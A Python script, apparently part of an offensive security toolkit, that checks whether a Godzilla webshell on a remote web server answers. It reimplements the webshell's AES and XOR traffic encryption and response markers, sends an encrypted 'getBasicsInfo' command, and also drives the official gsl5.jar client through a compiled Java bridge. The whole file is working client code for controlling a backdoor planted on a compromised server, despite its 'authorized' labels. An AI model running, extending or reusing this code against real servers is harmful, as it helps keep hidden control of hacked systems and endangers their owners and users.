#!/usr/bin/env python3
"""Test connectivity to an authorized Godzilla webshell."""

from __future__ import annotations

import argparse
import base64
import codecs
import hashlib
import json
import os
import re
import subprocess
import sys
import tempfile
import urllib.parse
from pathlib import Path
from typing import Any

import requests
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes


ALLOWED_OPERATIONS = {"test", "help", "list"}
MAX_RESPONSE_BYTES = 2 * 1024 * 1024
ALLOWED_OPTIONS = {
    "url",
    "password",
    "secret_key",
    "payload",
    "cryptor",
    "encoding",
    "headers",
    "timeout",
    "verify_tls",
    "protocol",
}

PROTOCOLS = {"auto", "official", "simplified"}

CRYPTOR_ALIASES = {
    "javaaesbase64": ("AES", "BASE64"),
    "javaaesraw": ("AES", "RAW"),
    "csharpevalaesbase64": ("AES", "BASE64"),
    "cshapaesbase64": ("AES", "BASE64"),
    "csharpaesbase64": ("AES", "BASE64"),
    "cshapaesraw": ("AES", "RAW"),
    "csharpaesraw": ("AES", "RAW"),
    "netcoreaesbase64": ("AES", "BASE64"),
    "phpxor": ("XOR", "BASE64"),
    "phpxorraw": ("XOR", "RAW"),
    "aspxorbae64": ("XOR", "BASE64"),
    "aspxorbase64": ("XOR", "BASE64"),
    "aspxorraw": ("XOR", "RAW"),
}

OFFICIAL_ALIASES = {
    "cshapaesbase64": "csharpaesbase64",
    "cshapaesraw": "csharpaesraw",
    "phpxor": "phpevalxorbase64",
    "aspxorbae64": "aspxorbase64",
}

_OFFICIAL_CATALOG_CACHE: dict[str, Any] | None = None

HELP_PAYLOAD = {
    "status": "help",
    "operation": "test",
    "parameters": {
        "url": "必填，http/https Godzilla WebShell 地址",
        "password": "必填，WebShell 密码参数名",
        "secret_key": "必填，Godzilla 通信密钥",
        "payload": "可选，按 cryptor 自动选择真实 Godzilla 动态载荷",
        "cryptor": "可选，默认 JavaAesBase64",
        "encoding": "可选，默认 UTF-8",
        "headers": "可选对象，例如 {\"Cookie\":\"sid=...\"}",
        "timeout": "可选，0.5-120 秒，默认 10",
        "verify_tls": "可选布尔值，默认 false",
        "protocol": "可选 auto/official/simplified，默认 auto；auto 与 official 只走 gsl5.jar，simplified 仅用于明确指定的自定义简化马",
    },
    "example": {
        "operation": "test",
        "url": "http://authorized.example/shell.jsp",
        "password": "sophon",
        "secret_key": "0123456789abcdef",
        "payload": "JavaDynamicPayload",
        "cryptor": "JavaAesBase64",
        "protocol": "auto",
    },
}


class ClientError(RuntimeError):
    def __init__(self, status: str, message: str, **details: Any):
        super().__init__(message)
        self.status = status
        self.details = details


def parse_operation(value: str) -> str:
    operation = str(value or "").strip().lower()
    if operation not in ALLOWED_OPERATIONS:
        raise ClientError("invalid_options", f"不支持的 operation: {operation or '-'}")
    return operation


def parse_options(raw: str) -> dict[str, Any]:
    try:
        options = json.loads(raw or "{}")
    except json.JSONDecodeError as exc:
        raise ClientError("invalid_options", f"options_json 不是有效 JSON: {exc}") from exc
    if not isinstance(options, dict):
        raise ClientError("invalid_options", "options_json 必须是 JSON 对象")
    unknown = sorted(set(options) - ALLOWED_OPTIONS)
    if unknown:
        raise ClientError("invalid_options", f"不支持的参数: {', '.join(unknown)}")
    return options


def parse_bool(value: Any, default: bool = False) -> bool:
    if value is None:
        return default
    if isinstance(value, bool):
        return value
    if isinstance(value, str):
        lowered = value.strip().lower()
        if lowered in {"true", "1", "yes", "on"}:
            return True
        if lowered in {"false", "0", "no", "off"}:
            return False
    raise ClientError("invalid_options", "verify_tls 必须是布尔值")


def parse_timeout(value: Any) -> float:
    try:
        timeout = float(10 if value is None or value == "" else value)
    except (TypeError, ValueError) as exc:
        raise ClientError("invalid_options", "timeout 必须是数字") from exc
    if timeout < 0.5 or timeout > 120:
        raise ClientError("invalid_options", "timeout 必须在 0.5-120 秒之间")
    return timeout


def parse_url(value: Any) -> str:
    target = str(value or "").strip()
    if not target:
        raise ClientError("invalid_options", "url 不能为空")
    if len(target) > 8192 or "\r" in target or "\n" in target:
        raise ClientError("invalid_options", "url 格式不合法")
    parsed = urllib.parse.urlsplit(target)
    if parsed.scheme not in {"http", "https"} or not parsed.hostname:
        raise ClientError("invalid_options", "url 仅允许有效的 http/https 地址")
    if parsed.username or parsed.password:
        raise ClientError("invalid_options", "url 不允许包含用户名或密码")
    return target


def parse_headers(value: Any) -> dict[str, str]:
    if value is None or value == "":
        return {}
    if not isinstance(value, dict):
        raise ClientError("invalid_options", "headers 必须是 JSON 对象")
    if len(value) > 32:
        raise ClientError("invalid_options", "headers 最多允许 32 项")
    headers: dict[str, str] = {}
    for raw_name, raw_value in value.items():
        name = str(raw_name or "").strip()
        text = str(raw_value or "").strip()
        if not name or "\r" in name or "\n" in name or ":" in name:
            raise ClientError("invalid_options", "headers 包含非法名称")
        if "\r" in text or "\n" in text:
            raise ClientError("invalid_options", "headers 包含非法换行")
        headers[name] = text
    return headers


def parse_encoding(value: Any) -> str:
    encoding = str(value or "UTF-8").strip()
    try:
        return codecs.lookup(encoding).name
    except LookupError as exc:
        raise ClientError("invalid_options", f"不支持的 encoding: {encoding}") from exc


def parse_cryptor(value: Any) -> tuple[str, str, str]:
    raw = str(value or "JavaAesBase64").strip()
    canonical = re.sub(r"[^a-z0-9]", "", raw.lower())
    cryptor = CRYPTOR_ALIASES.get(canonical)
    if cryptor is None:
        raise ClientError("invalid_options", f"不支持的 cryptor: {raw}")
    return raw, cryptor[0], cryptor[1]


def canonical_name(value: Any) -> str:
    return re.sub(r"[^a-z0-9]", "", str(value or "").lower())


def parse_protocol(value: Any) -> str:
    protocol = str(value or "auto").strip().lower()
    if protocol not in PROTOCOLS:
        raise ClientError("invalid_options", "protocol 仅支持 auto、official、simplified")
    return protocol


def aes_key(secret_key: str) -> bytes:
    key = secret_key.encode("utf-8")
    if len(key) < 16:
        return key.ljust(16, b"\x00")
    if len(key) < 24:
        return key[:16]
    if len(key) < 32:
        return key[:24]
    return key[:32]


def aes_encrypt(secret_key: str, data: bytes) -> bytes:
    padder = padding.PKCS7(128).padder()
    padded = padder.update(data) + padder.finalize()
    encryptor = Cipher(algorithms.AES(aes_key(secret_key)), modes.ECB()).encryptor()
    return encryptor.update(padded) + encryptor.finalize()


def aes_decrypt(secret_key: str, data: bytes) -> bytes:
    decryptor = Cipher(algorithms.AES(aes_key(secret_key)), modes.ECB()).decryptor()
    padded = decryptor.update(data) + decryptor.finalize()
    unpadder = padding.PKCS7(128).unpadder()
    return unpadder.update(padded) + unpadder.finalize()


def xor_transform(secret_key: str, data: bytes) -> bytes:
    key = secret_key.encode("utf-8")
    result = bytearray(len(data))
    for index, value in enumerate(data):
        key_index = (index + 1) & 15
        key_byte = key[key_index] if key_index < len(key) else 0
        result[index] = value ^ key_byte
    return bytes(result)


def encrypt_payload(secret_key: str, algorithm: str, data: bytes) -> bytes:
    if algorithm == "AES":
        return aes_encrypt(secret_key, data)
    if algorithm == "XOR":
        return xor_transform(secret_key, data)
    raise ClientError("invalid_options", f"不支持的加密算法: {algorithm}")


def decrypt_payload(secret_key: str, algorithm: str, data: bytes) -> bytes:
    if algorithm == "AES":
        return aes_decrypt(secret_key, data)
    if algorithm == "XOR":
        return xor_transform(secret_key, data)
    raise ClientError("invalid_options", f"不支持的加密算法: {algorithm}")


def response_markers(password: str, secret_key: str) -> tuple[bytes, bytes]:
    digest = hashlib.md5(f"{password}{secret_key}".encode("utf-8")).hexdigest().encode("ascii")
    return digest[:16], digest[16:]


def unwrap_response(content: bytes, password: str, secret_key: str) -> bytes:
    prefix, suffix = response_markers(password, secret_key)
    start = content.find(prefix)
    if start < 0:
        raise ClientError("protocol_error", "响应缺少 Godzilla 左标志，无法确认连接")
    payload_start = start + len(prefix)
    end = content.find(suffix, payload_start)
    if end < 0:
        raise ClientError("protocol_error", "响应缺少 Godzilla 右标志，无法确认连接")
    return content[payload_start:end]


def decode_base64(value: bytes) -> bytes:
    compact = b"".join(value.split())
    if not compact:
        raise ClientError("protocol_error", "Godzilla 响应为空")
    padding_size = (-len(compact)) % 4
    try:
        return base64.b64decode(compact + b"=" * padding_size, validate=False)
    except ValueError as exc:
        raise ClientError("protocol_error", "Godzilla 响应不是有效 Base64") from exc


def read_limited_response(response: requests.Response) -> bytes:
    content = bytearray()
    for chunk in response.iter_content(chunk_size=64 * 1024):
        if not chunk:
            continue
        content.extend(chunk)
        if len(content) > MAX_RESPONSE_BYTES:
            raise ClientError(
                "protocol_error",
                f"Godzilla 响应超过 {MAX_RESPONSE_BYTES} 字节限制",
            )
    return bytes(content)


def test_simplified_connection(options: dict[str, Any]) -> dict[str, Any]:
    target = parse_url(options.get("url"))
    password = str(options.get("password") or "")
    secret_key = str(options.get("secret_key") or "")
    if not password:
        raise ClientError("invalid_options", "password 不能为空")
    if not secret_key:
        raise ClientError("invalid_options", "secret_key 不能为空")
    payload_name = str(options.get("payload") or "JavaShell").strip()
    cryptor_name, algorithm, transport = parse_cryptor(options.get("cryptor"))
    encoding = parse_encoding(options.get("encoding"))
    headers = parse_headers(options.get("headers"))
    timeout = parse_timeout(options.get("timeout"))
    verify_tls = parse_bool(options.get("verify_tls"), False)

    encrypted = encrypt_payload(secret_key, algorithm, b"getBasicsInfo")
    request_headers = {
        "User-Agent": "Mozilla/5.0",
        "Accept": "*/*",
        **headers,
    }
    try:
        with requests.Session() as session:
            if transport == "BASE64":
                value = base64.b64encode(encrypted).decode("ascii")
                request = session.post(
                    target,
                    data={password: value},
                    headers=request_headers,
                    timeout=timeout,
                    verify=verify_tls,
                    allow_redirects=False,
                    stream=True,
                )
            else:
                request_headers["Content-Type"] = "application/octet-stream"
                request = session.post(
                    target,
                    data=encrypted,
                    headers=request_headers,
                    timeout=timeout,
                    verify=verify_tls,
                    allow_redirects=False,
                    stream=True,
                )
            with request as response:
                response_status = response.status_code
                response_content = read_limited_response(response)
    except requests.RequestException as exc:
        return {
            "connected": False,
            "status": "network_error",
            "target": target,
            "message": f"{type(exc).__name__}: {exc}",
        }
    except ClientError as exc:
        return {
            "connected": False,
            "status": exc.status,
            "target": target,
            "message": str(exc),
        }

    base_result = {
        "target": target,
        "http_status": response_status,
        "response_bytes": len(response_content),
        "payload": payload_name,
        "cryptor": cryptor_name,
    }
    if not 200 <= response_status < 300:
        return {
            **base_result,
            "connected": False,
            "status": "http_error",
            "message": f"目标返回 HTTP {response_status}",
        }

    try:
        inner = unwrap_response(response_content, password, secret_key)
        if transport == "BASE64":
            inner = decode_base64(inner)
        plain = decrypt_payload(secret_key, algorithm, inner)
    except ClientError as exc:
        return {
            **base_result,
            "connected": False,
            "status": exc.status,
            "message": str(exc),
        }
    except Exception as exc:
        return {
            **base_result,
            "connected": False,
            "status": "protocol_error",
            "message": f"Godzilla 响应解密失败: {type(exc).__name__}",
        }

    text = plain.decode(encoding, errors="replace").strip()
    if not text:
        return {
            **base_result,
            "connected": False,
            "status": "protocol_error",
            "message": "Godzilla 响应解密后为空",
        }
    return {
        **base_result,
        "connected": True,
        "status": "connected",
        "message": "Godzilla 协议握手成功",
        "sample": text[:240],
    }


def godzilla_jar_path() -> Path:
    root = Path(__file__).resolve().parent.parent
    candidates = (
        root / "customTools" / "vendor" / "godzilla" / "gsl5.jar",
        root / "thirdTools" / "gsl5.jar",
    )
    for path in candidates:
        if path.is_file():
            return path
    raise ClientError("official_unavailable", "未找到 Godzilla gsl5.jar")


def ensure_official_bridge_class(jar_path: Path, bridge_path: Path) -> Path:
    class_dir = Path(tempfile.gettempdir()) / "sophon-godzilla-bridge"
    class_file = class_dir / "GodzillaBridge.class"
    if (
        class_file.is_file()
        and class_file.stat().st_mtime >= bridge_path.stat().st_mtime
        and class_file.stat().st_mtime >= jar_path.stat().st_mtime
    ):
        return class_dir
    class_dir.mkdir(mode=0o700, parents=True, exist_ok=True)
    javac_bin = str(os.environ.get("GODZILLA_JAVAC_BIN") or "javac")
    try:
        completed = subprocess.run(
            [
                javac_bin,
                "-cp",
                str(jar_path),
                "-d",
                str(class_dir),
                str(bridge_path),
            ],
            capture_output=True,
            text=True,
            timeout=30,
            check=False,
        )
    except (OSError, subprocess.SubprocessError) as exc:
        raise ClientError("official_unavailable", f"Godzilla Java 探针编译失败: {type(exc).__name__}") from exc
    if completed.returncode != 0 or not class_file.is_file():
        detail = (completed.stderr or completed.stdout or "javac failed").strip()
        raise ClientError("official_unavailable", detail[:300])
    return class_dir


def official_java_prefix(class_dir: Path) -> list[str]:
    return [
        str(os.environ.get("GODZILLA_JAVA_BIN") or "java"),
        "-Djava.awt.headless=true",
        "-cp",
        os.pathsep.join((str(class_dir), str(godzilla_jar_path()))),
        "GodzillaBridge",
    ]


def run_official_catalog(force: bool = False) -> dict[str, Any]:
    global _OFFICIAL_CATALOG_CACHE
    if _OFFICIAL_CATALOG_CACHE is not None and not force:
        return _OFFICIAL_CATALOG_CACHE
    jar_path = godzilla_jar_path()
    bridge_path = Path(__file__).with_name("GodzillaBridge.java")
    if not bridge_path.is_file():
        raise ClientError("official_unavailable", "未找到 GodzillaBridge.java")
    class_dir = ensure_official_bridge_class(jar_path, bridge_path)
    command = official_java_prefix(class_dir) + ["--list"]
    try:
        completed = subprocess.run(
            command,
            capture_output=True,
            text=True,
            timeout=30,
            check=False,
        )
    except (OSError, subprocess.SubprocessError) as exc:
        raise ClientError(
            "official_unavailable",
            f"读取 Godzilla 官方协议目录失败: {type(exc).__name__}",
        ) from exc
    output = (completed.stdout or "").strip()
    last_error = ""
    for line in reversed(output.splitlines()):
        try:
            payload = json.loads(line)
        except json.JSONDecodeError:
            continue
        if isinstance(payload, dict) and payload.get("status") == "error":
            last_error = str(payload.get("message") or "")
            continue
        if isinstance(payload, dict) and isinstance(payload.get("payloads"), list):
            by_cryptor: dict[str, dict[str, str]] = {}
            for item in payload["payloads"]:
                if not isinstance(item, dict):
                    continue
                payload_name = str(item.get("payload") or "").strip()
                for cryptor in item.get("cryptors") or []:
                    cryptor_name = str(cryptor or "").strip()
                    if cryptor_name and payload_name:
                        by_cryptor[canonical_name(cryptor_name)] = {
                            "cryptor": cryptor_name,
                            "payload": payload_name,
                        }
            catalog = {
                "status": "ok",
                "payloads": payload["payloads"],
                "by_cryptor": by_cryptor,
            }
            _OFFICIAL_CATALOG_CACHE = catalog
            return catalog
    detail = last_error or (completed.stderr or output or "Godzilla 官方协议目录为空").strip()
    raise ClientError("official_unavailable", detail[:500])


def resolve_official_protocol(
    cryptor_name: Any,
    payload_name: Any = "",
) -> tuple[str, str]:
    raw_cryptor = str(cryptor_name or "JavaAesBase64").strip()
    canonical = canonical_name(raw_cryptor)
    catalog = run_official_catalog()
    by_cryptor = catalog["by_cryptor"]
    entry = by_cryptor.get(canonical)
    if entry is None:
        alias = OFFICIAL_ALIASES.get(canonical, "")
        if alias:
            entry = by_cryptor.get(alias)
    if entry is None:
        supported = sorted(
            {
                str(item.get("cryptor") or "")
                for item in by_cryptor.values()
                if item.get("cryptor")
            }
        )
        raise ClientError(
            "unsupported_cryptor",
            f"gsl5.jar 不支持 cryptor: {raw_cryptor}",
            supported=supported,
        )
    resolved_payload = str(entry["payload"])
    requested_payload = str(payload_name or "").strip()
    if requested_payload and canonical_name(requested_payload) != canonical_name(resolved_payload):
        raise ClientError(
            "invalid_options",
            f"cryptor {entry['cryptor']} 只适用于 payload {resolved_payload}，"
            f"不能指定为 {requested_payload}",
        )
    return str(entry["cryptor"]), resolved_payload


def official_probe_command(
    target: str,
    password: str,
    secret_key: str,
    payload_name: str,
    cryptor_name: str,
    encoding: str,
    timeout: float,
    verify_tls: bool,
    headers: dict[str, str],
    class_dir: Path,
) -> list[str]:
    header_text = "\n".join(f"{name}:{value}" for name, value in headers.items())
    headers_encoded = base64.b64encode(header_text.encode("utf-8")).decode("ascii")
    timeout_seconds = max(1, min(120, int(round(timeout))))
    return official_java_prefix(class_dir) + [
        target,
        password,
        secret_key,
        payload_name,
        cryptor_name,
        encoding,
        str(timeout_seconds),
        str(timeout_seconds),
        "true" if verify_tls else "false",
        headers_encoded,
    ]


def run_official_probe(options: dict[str, Any]) -> dict[str, Any]:
    target = parse_url(options.get("url"))
    password = str(options.get("password") or "")
    secret_key = str(options.get("secret_key") or "")
    if not password:
        raise ClientError("invalid_options", "password 不能为空")
    if not secret_key:
        raise ClientError("invalid_options", "secret_key 不能为空")
    cryptor_name = str(options.get("cryptor") or "JavaAesBase64").strip()
    official_cryptor, payload_name = resolve_official_protocol(
        cryptor_name,
        options.get("payload"),
    )
    encoding = parse_encoding(options.get("encoding"))
    headers = parse_headers(options.get("headers"))
    timeout = parse_timeout(options.get("timeout"))
    verify_tls = parse_bool(options.get("verify_tls"), False)
    jar_path = godzilla_jar_path()
    bridge_path = Path(__file__).with_name("GodzillaBridge.java")
    class_dir = ensure_official_bridge_class(jar_path, bridge_path)
    command = official_probe_command(
        target,
        password,
        secret_key,
        payload_name,
        official_cryptor,
        encoding,
        timeout,
        verify_tls,
        headers,
        class_dir,
    )
    try:
        completed = subprocess.run(
            command,
            capture_output=True,
            text=True,
            timeout=timeout + 15,
            check=False,
        )
    except (OSError, subprocess.SubprocessError) as exc:
        raise ClientError("official_unavailable", f"Godzilla Java 探测失败: {type(exc).__name__}") from exc
    output = (completed.stdout or "").strip()
    for line in reversed(output.splitlines()):
        try:
            result = json.loads(line)
        except json.JSONDecodeError:
            continue
        if not isinstance(result, dict):
            continue
        result.setdefault("target", target)
        result.setdefault("payload", payload_name)
        result.setdefault("cryptor", cryptor_name)
        return result
    detail = (completed.stderr or output or "Godzilla Java 探测没有返回 JSON").strip()
    raise ClientError("protocol_error", detail[:300])


def test_connection(options: dict[str, Any]) -> dict[str, Any]:
    protocol = parse_protocol(options.get("protocol"))
    if protocol == "simplified":
        return test_simplified_connection(options)
    try:
        return run_official_probe(options)
    except ClientError as exc:
        if exc.status == "invalid_options":
            raise
        return {
            "connected": False,
            "status": exc.status,
            "target": str(options.get("url") or ""),
            "message": str(exc),
            **exc.details,
        }


def help_payload() -> dict[str, Any]:
    payload = dict(HELP_PAYLOAD)
    try:
        catalog = run_official_catalog()
        payload["official_cryptors"] = sorted(
            {
                str(item.get("cryptor") or "")
                for item in catalog["by_cryptor"].values()
                if item.get("cryptor")
            }
        )
    except ClientError as exc:
        payload["official_catalog_error"] = {
            "status": exc.status,
            "message": str(exc),
        }
    return payload


def dispatch(operation: str, options_json: str) -> dict[str, Any]:
    operation = parse_operation(operation)
    if operation == "help":
        return help_payload()
    if operation == "list":
        return run_official_catalog()
    options = parse_options(options_json)
    if operation == "test":
        return test_connection(options)
    raise ClientError("invalid_options", f"不支持的 operation: {operation}")


def parse_cli(argv: list[str]) -> tuple[str, dict[str, Any]]:
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument("operation", nargs="?")
    parser.add_argument("options_json", nargs="?")
    parser.add_argument("--url")
    parser.add_argument("--password")
    parser.add_argument("--secret-key")
    parser.add_argument("--payload")
    parser.add_argument("--cryptor")
    parser.add_argument("--encoding")
    parser.add_argument("--headers-json")
    parser.add_argument("--timeout")
    parser.add_argument("--verify-tls", action="store_true")
    parser.add_argument("--protocol")
    args = parser.parse_args(argv[1:])

    operation = str(args.operation or "help").strip().lower()
    if operation in {"help", "list"}:
        return operation, {}
    if operation != "test":
        raise ClientError("invalid_options", f"不支持的 operation: {operation}")

    if args.options_json:
        flag_values = {
            "url": args.url,
            "password": args.password,
            "secret_key": args.secret_key,
            "payload": args.payload,
            "cryptor": args.cryptor,
            "encoding": args.encoding,
            "headers_json": args.headers_json,
            "timeout": args.timeout,
            "verify_tls": args.verify_tls,
            "protocol": args.protocol,
        }
        if any(value not in {None, False, ""} for value in flag_values.values()):
            raise ClientError("invalid_options", "options_json 与独立参数不能同时使用")
        return operation, parse_options(args.options_json)

    options: dict[str, Any] = {}
    for key, value in {
        "url": args.url,
        "password": args.password,
        "secret_key": args.secret_key,
        "payload": args.payload,
        "cryptor": args.cryptor,
        "encoding": args.encoding,
        "timeout": args.timeout,
        "protocol": args.protocol,
    }.items():
        if value not in {None, ""}:
            options[key] = value
    if args.headers_json:
        try:
            options["headers"] = json.loads(args.headers_json)
        except json.JSONDecodeError as exc:
            raise ClientError("invalid_options", f"headers_json 不是有效 JSON: {exc}") from exc
    options["verify_tls"] = bool(args.verify_tls)
    return operation, options


def main(argv: list[str]) -> int:
    try:
        operation, options = parse_cli(argv)
        if operation == "help":
            result = help_payload()
        elif operation == "list":
            result = run_official_catalog()
        else:
            result = test_connection(options)
    except ClientError as exc:
        print(
            json.dumps(
                {
                    "connected": False,
                    "status": exc.status,
                    "message": str(exc),
                    **exc.details,
                },
                ensure_ascii=False,
            )
        )
        return 2
    print(json.dumps(result, ensure_ascii=False))
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
